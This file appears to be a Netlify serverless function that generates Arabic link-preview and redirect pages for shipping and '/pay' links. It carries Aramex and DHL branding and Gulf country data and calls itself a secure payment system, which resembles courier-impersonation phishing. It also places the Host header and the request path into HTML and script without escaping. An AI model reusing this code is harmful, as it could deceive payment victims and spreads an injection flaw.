// Service data mapping
const serviceData = {
  aramex: {
    name: "أرامكس - Aramex",
    description: "شركة رائدة في خدمات الشحن السريع",
    ogImage: "/og-aramex.jpg"
  },
  dhl: {
    name: "دي إتش إل - DHL",
    description: "شبكة شحن عالمية",
    ogImage: "/og-dhl.jpg"
  }
};

// Country data mapping
const countryData = {
  AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
  SA: { nameAr: "المملكة العربية السعودية", name: "Saudi Arabia" },
  KW: { nameAr: "دولة الكويت", name: "Kuwait" },
  QA: { nameAr: "دولة قطر", name: "Qatar" },
  OM: { nameAr: "سلطنة عُمان", name: "Oman" },
  BH: { nameAr: "مملكة البحرين", name: "Bahrain" }
};

exports.handler = async (event, context) => {
  try {
    // CRITICAL: Initialize ALL variables
    let title = "منصة الشحن الذكية";
    let description = "نظام دفع آمن";
    let serviceName = 'خدمة الشحن';  // ALWAYS DEFINED
    let metaSiteName = 'منصة الشحن الذكية';
    let originalPath = '/';
    let countryCode = 'SA';
    let type = 'shipping';
    let id = 'unknown';

    // Get query parameters
    const queryParams = event.queryStringParameters || {};
    originalPath = queryParams.path || '/';

    // Build full URL
    const host = event.headers?.host || 'dynamic-sunflower-49efe2.netlify.app';
    const protocol = event.headers?.['x-forwarded-proto'] || 'https';
    const siteUrl = protocol + '://' + host;
    const fullUrl = siteUrl + originalPath;

    // Extract path parameters
    const pathMatch = originalPath.match(/^\/(?:r\/([A-Z]{2})\/(shipping|chalet)\/([a-zA-Z0-9-]+)|pay\/([a-zA-Z0-9-]+))/);

    if (pathMatch) {
      if (pathMatch[1]) {
        // Matched /r/:country/:type/:id
        countryCode = pathMatch[1];
        type = pathMatch[2];
        id = pathMatch[3];
      } else {
        // Matched /pay/:id
        id = pathMatch[4];
        type = 'shipping';
      }
    }

    // Set defaults
    title = 'صفحة ' + (type === 'shipping' ? 'الشحن' : 'الدفع');
    description = 'نظام دفع آمن ومحمي';
    metaSiteName = 'منصة الشحن الذكية';

    // Generate HTML
    const html = '<!DOCTYPE html>\n' +
      '<html lang="ar" dir="rtl">\n' +
      '<head>\n' +
      '  <meta charset="UTF-8" />\n' +
      '  <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n' +
      '  <title>' + title + '</title>\n' +
      '  <meta name="description" content="' + description + '" />\n' +
      '  <meta property="og:title" content="' + title + '" />\n' +
      '  <meta property="og:description" content="' + description + '" />\n' +
      '  <meta property="og:image" content="/og-aramex.jpg" />\n' +
      '  <meta property="og:url" content="' + fullUrl + '" />\n' +
      '  <style>\n' +
      '    body {\n' +
      '      font-family: Arial, sans-serif;\n' +
      '      margin: 0;\n' +
      '      padding: 20px;\n' +
      '      background: linear-gradient(135deg, #0EA5E9, #06B6D4);\n' +
      '      color: white;\n' +
      '      text-align: center;\n' +
      '    }\n' +
      '    .loading {\n' +
      '      animation: pulse 2s infinite;\n' +
      '    }\n' +
      '    @keyframes pulse {\n' +
      '      0%, 100% { opacity: 1; }\n' +
      '      50% { opacity: 0.5; }\n' +
      '    }\n' +
      '  </style>\n' +
      '</head>\n' +
      '<body>\n' +
      '  <div class="loading">\n' +
      '    <h1>' + title + '</h1>\n' +
      '    <p>' + description + '</p>\n' +
      '  </div>\n' +
      '  <script>\n' +
      '    setTimeout(function() {\n' +
      '      window.location.href = "' + fullUrl + '";\n' +
      '    }, 100);\n' +
      '  </script>\n' +
      '</body>\n' +
      '</html>';

    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-cache'
      },
      body: html
    };
  } catch (error) {
    console.error('Function error:', error);
    return {
      statusCode: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8'
      },
      body: '<!DOCTYPE html><html><body><h1>خطأ في الخادم</h1></body></html>'
    };
  }
};
